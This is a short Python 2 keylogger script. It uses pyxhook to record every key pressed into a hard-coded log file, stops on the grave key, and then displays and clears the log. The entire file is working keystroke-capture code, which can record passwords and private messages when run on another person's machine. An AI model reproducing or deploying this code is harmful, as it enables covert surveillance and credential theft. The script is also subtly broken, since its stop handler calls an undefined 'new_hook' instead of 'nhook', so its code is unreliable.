import pyxhook
import os
     #change here \/
log_file='/home/rounak/Desktop/file.log'

def keypress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

#ASCII value of grave key
  if event.Ascii==96:
    fob.close()
    new_hook.cancel()
    raw_input("\tLog file saved. To view press ENTER : ")
    view()

raw_input("\n\tPress ENTER to start keyloggging :")
print "\tTo stop press GRAVE key (`)"

nhook=pyxhook.HookManager()
nhook.KeyDown=keypress
nhook.HookKeyboard()
nhook.start()

def view():
	print "\tYou are now viewing : \n\n----------"
	f = open(log_file, 'r')
	content=f.read()
	print ""
	print content
	f.close()
	f = open(log_file, 'w')
	f.write("START\n")
	f.close()
	print("----------\n\n\tNOW FILE CONTENTS ARE DELETED FOR SECURITY PURPOSE")
